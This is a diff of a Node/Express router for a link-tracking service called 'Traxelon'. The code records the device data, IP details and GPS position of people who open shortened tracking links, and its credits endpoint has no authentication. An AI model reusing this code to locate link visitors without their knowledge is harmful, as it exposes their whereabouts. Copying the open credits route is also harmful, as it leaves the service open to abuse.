@@ -59,7 +59,7 @@ async function reverseGeocode(lat, lon) {
 async function enrichIP(ip) {
     try {
         if (!ip || ip === "::1" || ip.startsWith("127.") || ip.startsWith("192.168.") || ip.startsWith("10.")) {
-            return { note: "Local IP — no enrichment" };
+            return { note: "Local IP" };
         }
         const res = await axios.get(
             `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,proxy,hosting,mobile`, { timeout: 5000 }
@@ -86,8 +86,24 @@ async function enrichIP(ip) {
     } catch { return {}; }
 }
 
+// ── Health check ─────────────────────────────────────────────────────────────
 router.get("/health", (_req, res) => res.status(200).json({ ok: true }));
 
+// ── Create tracking link ──────────────────────────────────────────────────────
+router.post("/shorten", async(req, res) => {
+    try {
+        const { uid, label, destinationUrl } = req.body;
+        if (!uid) return res.status(400).json({ error: "uid is required" });
+        if (!destinationUrl) return res.status(400).json({ error: "destinationUrl is required" });
+        const result = await createTrackingLink(uid, label, destinationUrl);
+        return res.status(200).json(result);
+    } catch (err) {
+        console.error("[POST /shorten]", err.message);
+        return res.status(400).json({ error: err.message });
+    }
+});
+
+// ── Capture device data ───────────────────────────────────────────────────────
 router.post("/capture", async(req, res) => {
     try {
         const body = req.body;
@@ -276,184 +292,7 @@ router.post("/capture", async(req, res) => {
     }
 });
 
-// router.post("/shorten", async(req, res) => {
-//     try {
-//         const { uid, label, destinationUrl } = req.body;
-//         if (!uid) return res.status(400).json({ error: "uid is required" });
-//         if (!destinationUrl) return res.status(400).json({ error: "destinationUrl is required" });
-//         const result = await createTrackingLink(uid, label, destinationUrl);
-//         return res.status(200).json(result);
-//     } catch (err) {
-//         console.error("[POST /shorten]", err.message);
-//         return res.status(400).json({ error: err.message });
-//     }
-// });
-
-router.post("/shorten-url", async(req, res) => {
-    try {
-        const { url, provider } = req.body;
-        if (!url) return res.status(400).json({ error: "url required" });
-
-        let shortUrl = null;
-
-        if (provider === "isgd") {
-            try {
-                const r = await axios.get(
-                    "https://is.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 8000, headers: { "User-Agent": "Traxelon/1.0" } }
-                );
-                const result = String(r.data || "").trim();
-                if (result.startsWith("https://is.gd/") || result.startsWith("http://is.gd/")) {
-                    shortUrl = result;
-                }
-            } catch (e) { console.error("is.gd failed:", e.message); }
-
-        } else if (provider === "vgd") {
-            try {
-                const r = await axios.get(
-                    "https://v.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 8000, headers: { "User-Agent": "Traxelon/1.0" } }
-                );
-                const result = String(r.data || "").trim();
-                if (result.startsWith("https://v.gd/") || result.startsWith("http://v.gd/")) {
-                    shortUrl = result;
-                }
-            } catch (e) { console.error("v.gd failed:", e.message); }
-
-        } else if (provider === "tinyurl") {
-            try {
-                const r = await axios.get(
-                    "https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url), { timeout: 8000 }
-                );
-                const result = String(r.data || "").trim();
-                if (result.startsWith("https://tinyurl.com/") || result.startsWith("http://tinyurl.com/")) {
-                    shortUrl = result;
-                }
-            } catch (e) { console.error("tinyurl failed:", e.message); }
-        }
-
-        if (!shortUrl) {
-            return res.status(200).json({ shortUrl: url, error: "Shortening failed, returning original" });
-        }
-
-        return res.status(200).json({ shortUrl });
-    } catch (err) {
-        console.error("[shorten-url]", err.message);
-        return res.status(200).json({ shortUrl: url });
-    }
-});
-
-router.get("/geo-ip", async(req, res) => {
-    const ip = getClientIP(req);
-    const data = await enrichIP(ip);
-    return res.status(200).json(data);
-});
-
-router.post("/credits", async(req, res) => {
-    try {
-        const { uid, amount } = req.body;
-        if (!uid || !amount) return res.status(400).json({ error: "uid and amount required" });
-        await addCredits(uid, Number(amount));
-        return res.status(200).json({ success: true });
-    } catch (err) {
-        return res.status(500).json({ error: err.message });
-    }
-});
-
-// GPS update route — called after redirect
-router.post("/capture-gps", async(req, res) => {
-    try {
-        const { token, gpsLat, gpsLon, gpsAccuracy, gpsAltitude, gpsSpeed, gpsHeading } = req.body;
-        if (!token || !gpsLat || !gpsLon) return res.status(400).json({ error: "missing data" });
-
-        // Reverse geocode
-        const geoData = await reverseGeocode(gpsLat, gpsLon);
-
-        const linksRef = db.collection("trackingLinks");
-        const snap = await linksRef.where("token", "==", token).get();
-        if (snap.empty) return res.status(404).json({ error: "not found" });
-
-        const linkDoc = snap.docs[0];
-        const linkData = linkDoc.data();
-        const captures = linkData.captures || [];
-
-        // Update the LAST capture with GPS data
-        if (captures.length > 0) {
-            const lastCapture = {...captures[captures.length - 1] };
-            lastCapture.gpsLat = gpsLat;
-            lastCapture.gpsLon = gpsLon;
-            lastCapture.gpsAccuracy = gpsAccuracy || null;
-            lastCapture.gpsAltitude = gpsAltitude || null;
-            lastCapture.gpsSpeed = gpsSpeed || null;
-            lastCapture.gpsHeading = gpsHeading || null;
-            lastCapture.gpsAddress = geoData.gpsAddress || null;
-            lastCapture.gpsCity = geoData.gpsCity || null;
-            lastCapture.gpsState = geoData.gpsState || null;
-            lastCapture.gpsPincode = geoData.gpsPincode || null;
-            lastCapture.gpsCountry = geoData.gpsCountry || null;
-            captures[captures.length - 1] = lastCapture;
-
-            await linksRef.doc(linkDoc.id).update({ captures });
-        }
-
-        return res.status(200).json({ ok: true });
-    } catch (err) {
-        console.error("[capture-gps]", err.message);
-        return res.status(500).json({ error: err.message });
-    }
-});
-
-
-
-router.post("/shorten-url", async(req, res) => {
-    try {
-        const { url } = req.body;
-        if (!url) return res.status(400).json({ error: "url required" });
-        const response = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`, { timeout: 8000 });
-        const short = response.data;
-        if (short && short.startsWith("https://tinyurl.com/")) {
-            return res.status(200).json({ shortUrl: short });
-        }
-        return res.status(200).json({ shortUrl: url });
-    } catch (err) {
-        console.error("[shorten-url]", err.message);
-        return res.status(200).json({ shortUrl: url });
-    }
-});
-
-router.post("/shorten-url", async(req, res) => {
-    try {
-        const { url } = req.body;
-        if (!url) return res.status(400).json({ error: "url required" });
-        const response = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`, { timeout: 8000 });
-        const short = response.data;
-        if (short && short.startsWith("https://tinyurl.com/")) {
-            return res.status(200).json({ shortUrl: short });
-        }
-        return res.status(200).json({ shortUrl: url });
-    } catch (err) {
-        console.error("[shorten-url]", err.message);
-        return res.status(200).json({ shortUrl: url });
-    }
-});
-
-router.post("/shorten-url", async(req, res) => {
-    try {
-        const { url } = req.body;
-        if (!url) return res.status(400).json({ error: "url required" });
-        const response = await axios.get(
-            "https://is.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 8000 }
-        );
-        const short = response.data;
-        if (short && short.startsWith("https://is.gd/")) {
-            return res.status(200).json({ shortUrl: short });
-        }
-        return res.status(200).json({ shortUrl: url });
-    } catch (err) {
-        console.error("[shorten-url]", err.message);
-        return res.status(200).json({ shortUrl: url });
-    }
-});
-
-// GPS update route
+// ── GPS update after redirect ─────────────────────────────────────────────────
 router.post("/capture-gps", async(req, res) => {
     try {
         const { token, gpsLat, gpsLon, gpsAccuracy, gpsAltitude, gpsSpeed, gpsHeading } = req.body;
@@ -487,49 +326,73 @@ router.post("/capture-gps", async(req, res) => {
     }
 });
 
-// URL shortener — supports multiple providers
+// ── URL Shortener — 3 providers, ONE route only ───────────────────────────────
 router.post("/shorten-url", async(req, res) => {
     try {
         const { url, provider } = req.body;
         if (!url) return res.status(400).json({ error: "url required" });
 
+        console.log(`[shorten-url] provider=${provider} url=${url}`);
         let shortUrl = null;
 
         if (provider === "isgd") {
-            // is.gd — free, unlimited, no signup
             const r = await axios.get(
-                `https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`, { timeout: 8000 }
+                "https://is.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
             );
-            if (r.data && r.data.startsWith("https://is.gd/")) shortUrl = r.data.trim();
+            const result = String(r.data || "").trim();
+            console.log("[shorten-url] is.gd response:", result);
+            if (result.startsWith("https://is.gd/") || result.startsWith("http://is.gd/")) {
+                shortUrl = result;
+            }
 
         } else if (provider === "vgd") {
-            // v.gd — same as is.gd but different domain
             const r = await axios.get(
-                `https://v.gd/create.php?format=simple&url=${encodeURIComponent(url)}`, { timeout: 8000 }
+                "https://v.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
             );
-            if (r.data && r.data.startsWith("https://v.gd/")) shortUrl = r.data.trim();
+            const result = String(r.data || "").trim();
+            console.log("[shorten-url] v.gd response:", result);
+            if (result.startsWith("https://v.gd/") || result.startsWith("http://v.gd/")) {
+                shortUrl = result;
+            }
 
         } else if (provider === "tinyurl") {
-            // TinyURL — free, no signup
             const r = await axios.get(
-                `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`, { timeout: 8000 }
+                "https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url), { timeout: 10000 }
             );
-            if (r.data && r.data.startsWith("https://tinyurl.com/")) shortUrl = r.data.trim();
-
-        } else {
-            // Default: is.gd
-            const r = await axios.get(
-                `https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`, { timeout: 8000 }
-            );
-            if (r.data && r.data.startsWith("https://is.gd/")) shortUrl = r.data.trim();
+            const result = String(r.data || "").trim();
+            console.log("[shorten-url] tinyurl response:", result);
+            if (result.startsWith("https://tinyurl.com/") || result.startsWith("http://tinyurl.com/")) {
+                shortUrl = result;
+            }
         }
 
-        return res.status(200).json({ shortUrl: shortUrl || url });
+        console.log(`[shorten-url] final shortUrl=${shortUrl}`);
+        return res.status(200).json({ shortUrl });
+
     } catch (err) {
-        console.error("[shorten-url]", err.message);
-        return res.status(200).json({ shortUrl: url });
+        console.error("[shorten-url] ERROR:", err.message);
+        return res.status(200).json({ shortUrl: null, error: err.message });
     }
 });
-export default router;
 
+// ── Geo IP ────────────────────────────────────────────────────────────────────
+router.get("/geo-ip", async(req, res) => {
+    const ip = getClientIP(req);
+    const data = await enrichIP(ip);
+    return res.status(200).json(data);
+});
+
+// ── Credits ───────────────────────────────────────────────────────────────────
+router.post("/credits", async(req, res) => {
+    try {
+        const { uid, amount } = req.body;
+        if (!uid || !amount) return res.status(400).json({ error: "uid and amount required" });
+        await addCredits(uid, Number(amount));
+        return res.status(200).json({ success: true });
+    } catch (err) {
+        return res.status(500).json({ error: err.message });
+    }
+});
+
+export default router;
 
